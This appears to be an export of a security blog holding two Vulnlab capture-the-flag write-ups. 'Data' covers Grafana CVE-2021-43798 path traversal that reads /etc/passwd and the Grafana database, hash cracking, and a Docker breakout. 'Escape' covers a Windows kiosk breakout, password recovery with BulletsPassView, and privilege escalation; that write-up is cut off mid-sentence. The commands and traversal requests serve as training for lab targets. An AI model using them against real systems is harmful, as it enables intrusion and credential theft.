/tmp/mount_xvda</span><br></pre></td></tr></table></figure>\n\n<p>If we access this specific directory where <code>xvda1</code> was mounted, we’ll see the filesystem of the docker controller here.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bash-5.1# cd mount_xvda/</span><br><span class=\"line\">bash-5.1# ls</span><br><span class=\"line\">bin             home            lib64           opt             sbin            tmp             vmlinuz.old</span><br><span class=\"line\">boot            initrd.img      lost+found      proc            snap            usr</span><br><span class=\"line\">dev             initrd.img.old  media           root            srv             var</span><br><span class=\"line\">etc             lib             mnt             run             sys             vmlinuz</span><br><span class=\"line\">bash-5.1# cd root</span><br><span class=\"line\">bash-5.1# ls</span><br><span class=\"line\">root.txt  snap</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we were successfully able to read the contents of the <code>/root</code> directory on the actual machine, meaning we have successfully completed this machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>Although I dislike Docker, this box was really fun altogether. Docker breakouts are trivial, however research into them is relatively straightforward and logically makes sense. The earlier parts of the machine were helpful as well, especially the portion where we needed to format the hash correctly before cracking it. Big thanks to xct for the development of this machine, as it helped a lot with practice.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://www.speedguide.net/port.php?port=3000\">https://www.speedguide.net/port.php?port=3000</a><br><a href=\"https://grafana.com/docs/grafana/latest/introduction/\">https://grafana.com/docs/grafana/latest/introduction/</a><br><a href=\"https://github.com/wagneralves/CVE-2021-43798/tree/main\">https://github.com/wagneralves/CVE-2021-43798/tree/main</a><br><a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/grafana\">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/grafana</a><br><a href=\"https://vulncheck.com/blog/grafana-cve-2021-43798\">https://vulncheck.com/blog/grafana-cve-2021-43798</a><br><a href=\"https://gchq.github.io/CyberChef/\">https://gchq.github.io/CyberChef/</a><br><a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a href=\"https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation\">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation</a></p>\n","cover_type":"img","excerpt":"","more":"<p>Data was another interesting machine that involved interacting with a Grafana web service and utilizing web-app exploits to gain access to a docker container. This is the first writeup that I’ve written that exploits docker breakout, so I hope I’ll be able to explain it properly. </p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start with a basic NMAP scan.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 12:15 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.64.184</span><br><span class=\"line\">Host is up (0.12s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">22/tcp   open  ssh</span><br><span class=\"line\">3000/tcp open  ppp</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 17.08 seconds</span><br></pre></td></tr></table></figure>\n\n<p>Given that the only other port is SSH, we’ll look towards port <code>3000</code> for the start of our attack path. You can find information about this specific port <a href=\"https://www.speedguide.net/port.php?port=3000\">here</a>, which it seems as though that we are able to access it through HTTP based off an aggressive scan I ran afterwards.</p>\n<p><img src=\"/images/vulnlab/data-vl/b.jpg\"></p>\n<p>This brings us to a Grafana landing page, one of the services that was listed on this port through the article I referenced earlier. The version of this application is <code>v8.0.0</code>, meaning we could potentially look for exploits for this specific version.</p>\n<p>As for the service itself, Grafana seems to be a web application used for data visualization. While we’re currently interacting with a login panel, authenticated users will be met with a framework&#x2F;GUI that allows them to configure imported data from databases such as SQL. You can find more information about the service via the documentation <a href=\"https://grafana.com/docs/grafana/latest/introduction/\">here</a>.</p>\n<h1 id=\"LFI-via-Plugins\"><a href=\"#LFI-via-Plugins\" class=\"headerlink\" title=\"LFI via Plugins\"></a>LFI via Plugins</h1><p>I did some research into this specific version <code>v8.0.0</code>, and it seems as though this is vulnerable to arbitrary file read via <a href=\"https://github.com/wagneralves/CVE-2021-43798/tree/main\">CVE-2021-43798</a>. This essentially allows us to traverse through the website’s root filesystem directly through the URL. The POC that I referenced does this manually for us - so we’ll use it to determine if we can access to any files.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ./ExploitGrafana.sh -h http://10.10.64.184:3000 -f /etc/passwd</span><br><span class=\"line\">Plugin alertlist Status code 200:</span><br><span class=\"line\">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class=\"line\">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class=\"line\">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 10.10.64.184:3000...</span><br><span class=\"line\">* Connected to 10.10.64.184 (10.10.64.184) port 3000</span><br><span class=\"line\">&gt; GET /public/plugins/alertlist/../../../../../../../../../../../../..//etc/passwd HTTP/1.1</span><br><span class=\"line\">&gt; Host: 10.10.64.184:3000</span><br><span class=\"line\">&gt; User-Agent: curl/8.7.1</span><br><span class=\"line\">&gt; Accept: */*</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">* Request completely sent off</span><br><span class=\"line\">&lt; HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>\n\n<p>It seems as though we were able to get a <code>200</code> response from the path traversal. You can see the GET request in the markdown above, and at the bottom of this commands output should be the <code>/etc/passwd</code> file of the machine. This confirms that the POC works and that the website is vulnerable.</p>\n<p>That being said, we’ll still need to be able to use this vulnerability to find credentials. This HackTricks <a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/grafana\">article</a> outlines a default file that we can grab that should have valid credentials to the website if it was installed with no further maintenance. The file that we are looking for is under <code>/var/lib/grafana/grafana.db</code>, the internal Grafana SQLITE database.</p>\n<p>We can grab this easily with cURL, and we can save it to a file locally using <code>--output</code> to prevent it from being outputted to the terminal.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ curl http://10.10.64.184:3000/public/plugins/alertlist/../../../../../../../../../..//var/lib/grafana/grafana.db --path-as-is --output grafana.db</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ ls</span><br><span class=\"line\">ExploitGrafana.sh  README.md  grafana.db</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the Grafana database locally, we can read it with <code>sqlite3</code> and use <code>.dump</code> to dump out all the contents of the database.<br>Alternatively, we can determine the specific table we want to look at by running <code>.tables</code>, which will tell us that there is a <code>user</code> table. We can then run <code>SELECT * from user;</code> to dump this table and all of its contents.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlite&gt; SELECT * FROM user;</span><br><span class=\"line\">1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0</span><br><span class=\"line\">2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Cracking-Grafana-Hashes\"><a href=\"#Cracking-Grafana-Hashes\" class=\"headerlink\" title=\"Cracking Grafana Hashes\"></a>Cracking Grafana Hashes</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlite&gt; select name,password,salt from user;</span><br><span class=\"line\">|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S</span><br><span class=\"line\">boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl</span><br></pre></td></tr></table></figure>\n\n<p>It seems that we were able to dump the passwords, though they’re in an odd format. If you’ll notice, we have the password to the user’s <code>boris</code> and <code>admin</code>, along with what looks to be a salt. Simply putting the password into a hash-identifier will not produce any results, we’ll need to crack this hash given the salt.</p>\n<p>Doing some more research, I found an article <a href=\"https://vulncheck.com/blog/grafana-cve-2021-43798\">here</a> that explains a bit about the hashing algorithm that Grafana uses for this database. That is, at least for this version that we’re currently on. It seems that the algorithm is just encoding the password and salts in Base64 before putting them after the <code>sha256:10000</code> identifier. Based on the article, the salt’s are simply passed through a standard base64 encoding, which we can encode by using <a href=\"https://gchq.github.io/CyberChef/\">CyberChef</a>.</p>\n<p>The same cannot be said for the password, as the hexadecimal bytes of the plaintext password are passed into the base64 encoding. I created a little snippet of code that does this for us using Python.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">hashed_password = <span class=\"string\">&quot;dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8&quot;</span></span><br><span class=\"line\">decoded_pass = <span class=\"built_in\">bytes</span>.fromhex(hashed_password)</span><br><span class=\"line\">b64_enc = base64.b64encode(decoded_pass).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(b64_enc)</span><br></pre></td></tr></table></figure>\n\n<p>After running the Python file above, we’ll receive the proper base64 encoding of the password. We can now format the password locally in order to use it with Hashcat.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=</span><br></pre></td></tr></table></figure>\n\n<p>The specific hash identifier for <code>PBKDF2-HMAC-SHA256</code> can be found on Hashcat’s documentation <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">here</a>. The identifier we’re looking for is <code>10900</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 10900 boris.txt /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">hashcat (v6.2.6) starting</span><br><span class=\"line\">......</span><br><span class=\"line\">sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:[...snip...]</span><br><span class=\"line\">  </span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br></pre></td></tr></table></figure>\n\n<p>It seems as though we were able to successfully crack this hash and have obtained the password for the <code>boris</code> user. We would normally use this to authenticate to the machine, however I tested it through SSH and it seems that this password is also used for SSH as <code>boris</code>.</p>\n<p><img src=\"/images/vulnlab/data-vl/c.jpg\"></p>\n<p>Now that we have the user flag, we can move onto privilege escalation to try and obtain root.</p>\n<h1 id=\"Docker-Breakout\"><a href=\"#Docker-Breakout\" class=\"headerlink\" title=\"Docker Breakout\"></a>Docker Breakout</h1><p>So before interacted with anything, you’ll see that the IP address on our command-line delimiter is different than the IP of the machine, being <code>10.10.10.11</code>. Furthermore, if you had looked at the MOTD from this machine when you authenticated, you can see that there is a network interface that we are connected to that has an IP address of <code>172.17.0.1</code>.</p>\n<p>This indicates to me that we are currently logged into a docker interface, meaning we’ll need to breakout of the container if we want to access the resources for root.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">boris@ip-10-10-10-11:~$ sudo -l</span><br><span class=\"line\">Matching Defaults entries for boris on ip-10-10-10-11:</span><br><span class=\"line\">    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User boris may run the following commands on ip-10-10-10-11:</span><br><span class=\"line\">    (root) NOPASSWD: /snap/bin/docker exec *</span><br></pre></td></tr></table></figure>\n\n<p>If you run <code>sudo -l</code> it seems as though we have sudo privileges to <code>/snap/bin/docker exec</code> and all of the contents of that specific binary. If we check the manual of the binary, we can see that it gives us a little more information on how to exploit it. You can find more information on how to exploit this using this HackTricks article <a href=\"https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation\">here</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">boris@ip-10-10-10-11:~$ sudo docker exec -h</span><br><span class=\"line\">Flag shorthand -h has been deprecated, please use --help</span><br><span class=\"line\"></span><br><span class=\"line\">Usage:  docker exec [OPTIONS] CONTAINER COMMAND [ARG...]</span><br><span class=\"line\"></span><br><span class=\"line\">Run a command in a running container</span><br><span class=\"line\"></span><br><span class=\"line\">Options:</span><br><span class=\"line\">  -d, --detach               Detached mode: run command in the background</span><br><span class=\"line\">      --detach-keys string   Override the key sequence for detaching a container</span><br><span class=\"line\">  -e, --env list             Set environment variables</span><br><span class=\"line\">      --env-file list        Read in a file of environment variables</span><br><span class=\"line\">  -i, --interactive          Keep STDIN open even if not attached</span><br><span class=\"line\">      --privileged           Give extended privileges to the command</span><br><span class=\"line\">  -t, --tty                  Allocate a pseudo-TTY</span><br><span class=\"line\">  -u, --user string          Username or UID (format: &lt;name|uid&gt;[:&lt;group|gid&gt;])</span><br><span class=\"line\">  -w, --workdir string       Working directory inside the container</span><br></pre></td></tr></table></figure>\n\n<p>There seems to be a <code>privileged</code> flag that we can run alongside the binary. This is most of what we’ll need, the only exception being a valid container. If you attempt to enumerate any of the running containers, you won’t be able to as we only have sudo access to <code>docker exec</code>. This means we’ll need to try and find any running containers&#x2F;container IDs, or just get lucky with a bit of guessing.</p>\n<p>Fortunately enough we won’t have to do any of that. If you run <code>ps awwfux</code> on this container, you’ll see that there’s already a container running in the context of root.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">root      1670  0.0  0.7 712860  7912 ?        Sl   16:11   0:00 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock</span><br></pre></td></tr></table></figure>\n\n<p>It also shows us the specific ID of this container, meaning we can attach to it using our <code>docker exec</code> command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">boris@ip-10-10-10-11:~$ sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bash</span><br><span class=\"line\">bash-5.1# whoami</span><br><span class=\"line\">root</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Mounting-XVDA\"><a href=\"#Mounting-XVDA\" class=\"headerlink\" title=\"Mounting XVDA\"></a>Mounting XVDA</h1><p>Although we are root, we aren’t technically finished yet. We’ll need to find the root flag, which is not currently on this machine as we are within a docker container.</p>\n<p>Through a quick bit of research, I found that the <code>/root</code> filesystem of the docker controller is within <code>/dev/xvda1</code>, meaning we can mount that to a local directory on our container to view the contents.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bash-5.1# pwd</span><br><span class=\"line\">/tmp/mount_xvda</span><br><span class=\"line\">bash-5.1# mount /dev/xvda1 /tmp/mount_xvda</span><br></pre></td></tr></table></figure>\n\n<p>If we access this specific directory where <code>xvda1</code> was mounted, we’ll see the filesystem of the docker controller here.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bash-5.1# cd mount_xvda/</span><br><span class=\"line\">bash-5.1# ls</span><br><span class=\"line\">bin             home            lib64           opt             sbin            tmp             vmlinuz.old</span><br><span class=\"line\">boot            initrd.img      lost+found      proc            snap            usr</span><br><span class=\"line\">dev             initrd.img.old  media           root            srv             var</span><br><span class=\"line\">etc             lib             mnt             run             sys             vmlinuz</span><br><span class=\"line\">bash-5.1# cd root</span><br><span class=\"line\">bash-5.1# ls</span><br><span class=\"line\">root.txt  snap</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we were successfully able to read the contents of the <code>/root</code> directory on the actual machine, meaning we have successfully completed this machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>Although I dislike Docker, this box was really fun altogether. Docker breakouts are trivial, however research into them is relatively straightforward and logically makes sense. The earlier parts of the machine were helpful as well, especially the portion where we needed to format the hash correctly before cracking it. Big thanks to xct for the development of this machine, as it helped a lot with practice.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://www.speedguide.net/port.php?port=3000\">https://www.speedguide.net/port.php?port=3000</a><br><a href=\"https://grafana.com/docs/grafana/latest/introduction/\">https://grafana.com/docs/grafana/latest/introduction/</a><br><a href=\"https://github.com/wagneralves/CVE-2021-43798/tree/main\">https://github.com/wagneralves/CVE-2021-43798/tree/main</a><br><a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/grafana\">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/grafana</a><br><a href=\"https://vulncheck.com/blog/grafana-cve-2021-43798\">https://vulncheck.com/blog/grafana-cve-2021-43798</a><br><a href=\"https://gchq.github.io/CyberChef/\">https://gchq.github.io/CyberChef/</a><br><a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a href=\"https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation\">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation</a></p>\n"},{"title":"Escape - Vulnlab","date":"2024-06-05T05:58:49.000Z","keywords":"Vulnlab, Easy, Windows","description":"This box was really creative, and involved a Kiosk breakout with the only port being 3389. When I initially started this, I was going into it relatively blind. The attack path is more so up to interpretation and really get's you thinking into understanding what you have access to and exploiting it.","cover":"/images/vulnlab/escape-vl/escape_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nThis box was really creative, and involved a Kiosk breakout with the only port being 3389. When I initially started this, I was going into it relatively blind. The attack path is more so up to interpretation and really get's you thinking into understanding what you have access to and exploiting it.\n\n# Enumeration\n\nWith that being said, let's start with our initial NMAP scan. Given that just RDP is on this machine, I'll run an aggressive scan immediately so that we can get the DNS information for our host file.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 21:28 EDT\nNmap scan report for 10.10.105.242\nHost is up (0.10s latency).\nNot shown: 999 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=Escape\n| Not valid before: 2024-02-02T11:08:33\n|_Not valid after:  2024-08-03T11:08:33\n| rdp-ntlm-info: \n|   Target_Name: ESCAPE\n|   NetBIOS_Domain_Name: ESCAPE\n|   NetBIOS_Computer_Name: ESCAPE\n|   DNS_Domain_Name: Escape\n|   DNS_Computer_Name: Escape\n|   Product_Version: 10.0.19041\n|_  System_Time: 2024-05-30T01:29:15+00:00\n|_ssl-date: 2024-05-30T01:29:20+00:00; +2s from scanner time.\n```\n\nThere's not much for us to enumerate, aside from attempting to RDP to the machine. We can do so with either `remmina`, `xfreerdp`, or `rdesktop`. I'll use `rdesktop` since I'm aware that you can authenticate with null credentials easy using that tool.\n\n# Restricted Kiosk Access\n\n```\n└─$ rdesktop -u DaZ 10.10.105.242\n[...snip...]\nDo you trust this certificate (yes/no)? yes\n```\n\n![](/images/vulnlab/escape-vl/b.jpg)\n\nGiven the result of the conference display, we are told to authenticate to this machine with the user `KioskUser0` without a password. We'll use `xfreerdp /v:10.10.105.242 /u:KioskUser0` to authenticate to this machine properly.\n\nOnce we login with the above command, we can see we are greeted with the home screen of a kiosk.\n\n![](/images/vulnlab/escape-vl/c.jpg)\n\nThere doesn't seem to be anything within our desktop interface, though we can access the Start Menu by pressing our home key.\n\nAnother thing you'll notice is that the interface is entirely in Korean, which is probably not an issue for some people (but I myself can't speak Korean). I tried changing this in the Language settings, which you can access from the search bar in the Start Menu. The only pre-req is that you'll need to either restart the machine or cause the current user to sign-out, which I do not believe we can accomplish until we get code execution.\n\nAt this point it's just a matter of messing around with what we can do - I found that there aren't any pertinent settings that we can change on the machine nor can we access cmd/PowerShell.\n\n![](/images/vulnlab/escape-vl/d.jpg)\n\nThere looks to be some form of policy that is disallowing us from access a lot of the machine's main resources, even File Explorer. I ended up downloading Google Translate on my phone and taking a picture of this, it seems the message says `\"Cannot open 'C:\\Windows\\System32'. Your organization has blocked you.\"`. I'm guessing that there is a GPO preventing us from accessing this specific folder and all of it's resources.\n\nSo let's do some thinking here - we're not able to access any resources in System32 which is preventing us from doing the majority of the legwork needed to get code execution. Without this we can't really get far into the kiosk. We also won't be able to access the File Explorer regularly since `iexplorer.exe` is within this folder.\n\n# Bypass using Installed Programs\n\nThat being said, there are other resources that we can access that are not in this specific folder that might help us. If search up `Apps & Features`, we can see applications such as Cortana, Paint, and a variety of O365 tools.\n\nYou'll notice though that Microsoft Edge is also here, which is the built-in browser for this machine that is installed automatically. The binary is denoted as `msedge.exe`, and can be found in `C:\\Program Files (x86)\\Microsoft\\Edge\\Application`. Since this binary isn't usually in System32, we should be able to access it if the GPO doesn't restrict it.\n\n\n![](/images/vulnlab/escape-vl/e.jpg)\n\nAfter accepting a few Edge first-launch parameters, we're greeted with the home-page for Edge.\n\nImmediately the first thing that came to me was the URL path. Right now, it seems that we are within `edge://welcome`, which is probably a landing page for Microsoft Edge within the contents of its directory. \n\nWhat's stopping us from altering this though? If we change the identifier to `file://` and change the file location, it shouldn't exempt us from accessing resources. This is because we're not trying to access directories in the context of `KioskUser0`, but instead as the user agent for Edge.\n\n![](/images/vulnlab/escape-vl/f.jpg)\n\nThis seemed to work! We should be able to access the entirety of the kiosk's filesystem through as the Edge user agent, meaning we can also technically read the first flag right now without getting code execution.\n\nThe file path for the first user flag can be denoted below.\n\n```\n(file:///C:/Users/kioskUser0/Desktop/user_07eb46.txt)\n```\n\nWhile this is great for showing how fast we were able to get the user flag, we still need to get code execution in some way. This involves a little more messing around with in terms of what we have access to - but our range of options should open up now that we have access to the System32 folder.\n\n# Misconfigured Policy Abuse\n\nOne thing to mention, you'll notice that if you try to access any binaries or executables, it will download them locally to your user's Download folder (excluding text files like the user flag). I'll start with trying to mess around with the `cmd.exe` and `powershell.exe` binaries.\n\nI managed to find a solution really quickly, which revolved around both of these binaries. If you try to download them, they'll pop-up with a warning (due to the filename being abnormal to Edge, it's a binary after all). Selecting the left option that pops-up will download the file to the `KioskUser0`'s download directory in their home folder.\n\n![](/images/vulnlab/escape-vl/g.jpg)\n\nYou can access this specific location within the filesystem by right-clicking on the binary and/or pressing the small folder icon that appears in the drop-down menu.\n\n![](/images/vulnlab/escape-vl/h.jpg)\n\nNot only are we able to access the file explorer now, but we can interact with this binary to potentially actually get code execution. You can do this with `cmd.exe` too, it's honestly up to your preference. If you try to execute this file, it will be blocked by the GPO and will prevent you from executing the binary and spawning a PowerShell session.\n\nNow let's think - the GPO itself is blocking all files that are ran within the System32 folder or that have the same name as the binaries that are within that folder (with what know so far). While the files themselves can have their signatures also blocked (essentially meaning all files that have application signatures or icons similar to applications like `powershell` or `cmd.exe`), we don't exactly know if that's true right now.\n\nHowever, if the GPO only relies on the name of the binary in order to block access, then we can probably change the name of the binary and run it in the context of a binary that is accepted. Let's take `msedge.exe` for example since we know we were able to access that when trying to open Edge. I'll change the name of the file to `msedge` by pressing `F2` after clicking on the binary once.\n\n![](/images/vulnlab/escape-vl/i.jpg)\n\nAfter opening the file, it seems like we were able to open up a PowerShell window! This means our theory from before was correct, the GPO is only blocking binaries that share a name with a binary in System32.\n\nNow that we have code execution, we would normally read the user flag now if we didn't view it earlier.\n\n# Privilege Escalation to Administrator\n\nNow that we have a PowerShell session, let's look for other users we can potentially exploit.\n\n```\n    Directory: C:\\Users\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----          2/3/2024   2:39 AM                admin\nd-----          2/3/2024   3:44 AM                Administrator\nd-----          2/3/2024   3:12 AM                DefaultAppPool\nd-----          2/3/2024   3:10 AM                kioskUser0\nd-r---          2/3/2024   2:38 AM                Public\n```\n\nIt seems that the only other user that we can potentially pivot to is either `admin` or `Administrator`. The other two profiles we can ignore as they're default users.\n\nThe `admin` user seems to be odd, as this is not a common account name. We can assume that this is the admin of the kiosk, in which is the user we are trying to escalate to. Before we try anything, let's see if we have any privileges that we can exploit.\n\n```\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                          State\n============================= ==================================== ========\nSeShutdownPrivilege           Shut down the system                 Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled\nSeUndockPrivilege             Remove computer from docking station Disabled\nSeIncreaseWorkingSetPrivilege Increase a process working set       Disabled\nSeTimeZonePrivilege           Change the time zone                 Disabled\n```\n\nWe don't seem to have any privileges that we can exploit, as these are relatively common privileges given to regular users.\n\nSo let's think - we don't have any privileges that we can exploit, there's only one user we can escalate to, there are no DPAPI credentials in `kioskUser0`'s home directory, and there isn't Active Directory enabled on this machine so we can't pivot to another domain user. This has to mean that there is a binary present on the machine that we can exploit in some way.\n\nI did some digging into the filesystem and found an interesting file within the root `C:\\` drive on the filesystem.\n\n```\nPS C:\\> Get-ChildItem . -Force\n\n\n    Directory: C:\\\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n[...snip...]\nd--h--          2/3/2024   3:05 AM                _admin\n[...snip...]\n```\n\nThis directory is also abnormal and isn't installed by default. Accessing this directory will lead you to two interesting files/directories, being `passwords` and `profiles.xml`\n\nDoing some more digging, it doesn't seem that `passwords` has much, though there does seem to be enticing information within the XML file.\n\n```\nPS C:\\_admin> cat profiles.xml\n<?xml version=\"1.0\" encoding=\"utf-16\"?>\n<!-- Remote Desktop Plus -->\n<Data>\n  <Profile>\n    <ProfileName>admin</ProfileName>\n    <UserName>127.0.0.1</UserName>\n    <Password>JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=</Password>\n    <Secure>False</Secure>\n  </Profile>\n</Data>\n```\n\nThis seems to be a user hash for the `admin` user, we can try to crack this with `JTR` or `Hashcat` however I couldn't find much success as they both could not recognize the hash. You'd think it's base64 encoded given the `=`, however I found that to not be true.\n\nThis file does belong to `Remote Desktop Plus`, which is not a normal application present on this machine. If we type in `rdp` into the search bar in the Start Menu, it looks like the application is installed already.\n\n# Reading Plaintext Passwords with BPV\n\nThough we aren't able to open it from here, we should be able to access the binary from within the PowerShell window we have right now. It's within `C:\\Program Files(x86)\\Remote Desktop Plus`.\n\n![](/images/vulnlab/escape-vl/j.jpg)\n\nI did some research into RDP+, there doesn't like anything that we can exploit in particular, and the initial window doesn't seem to have any important information.\n\nThat is until I realized the one thing we can do, which is within `Manage profiles...`. We don't have any profiles at first in the window that pops up, but it does allow us to import profiles based on a respective profile file. We did have one before for the `admin` user, so let's try to import that. Note that you'll need to move the `profiles.xml` file to a place you can actually access, which I moved to the `Downloads` folder and then imported from there.\n\n![](/images/vulnlab/escape-vl/k.jpg)\n\nNow that we imported the profile - we can see that RDP+ displays the password in bulleted-text. This means that the plaintext password must've been loaded into the application, as the length has shrunk immensely (in comparison to the hash).\n\nNow that we have the password technically on our screen, we can use a tool that isn't commonly used on machines for red-teaming - [BulletsPassView](https://www.nirsoft.net/utils/bullets_password_view.html). This is a password recovery tool, and is used to reveal passwords that are stored behind bullets in a regular text-box. It's used to help users who forget their passwords, and allows them to easily reveal and copy their plaintext passwords for reusage.\n\nWe'll be using this tool to help reveal the `admin` password. This specific executable isn't malicious in nature, which I'm thankful for since Defender is enabled on this kiosk. (You can test this by just running `\"Invoke-Mimikatz\"` in your PowerShell session.)\n\nAll that we'll need is a Python server on our Kali machine (we're actually using our Kali host for the first time - and we're about to root this box!) with the BPV.exe file. You can download BPV from the link I posted and start a Python server with `python3 -m http.server (PORT)`.\n\nAfter that's finished, we'll use cURL to download the executable to the kiosk `curl http://(KALI IP):(PORT)/BuletsPassView.exe -O BPV.exe`. We can then run the binary and the application should load. (Note, make sure to download the x64-bit version so it can properly detect RDP+)\n\n![](/images/vulnlab/escape-vl/l.jpg)\n\nIf you have both RDP+ and BPV opened, upon refreshing you should see the password in plaintext. This means we can now escalate to this user! You can do so by just starting a new PowerShell process using `runas`.\n\n```\nPS C:\\Users\\kioskUser0\\Downloads> runas /user:ESCAPE\\admin C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n```\n\nThis should elevate us to `admin`, though you'll notice that our privileges are still the same as the `Administrator` user. We can circumvent this by doing `Start-Process powershell -verb runAs` to start up another PowerShell window in the context of the Administrator user as the `admin` user as UAC bypass enabled. If you run `whoami /priv` after this, you'll see that we are now the Administrator on the 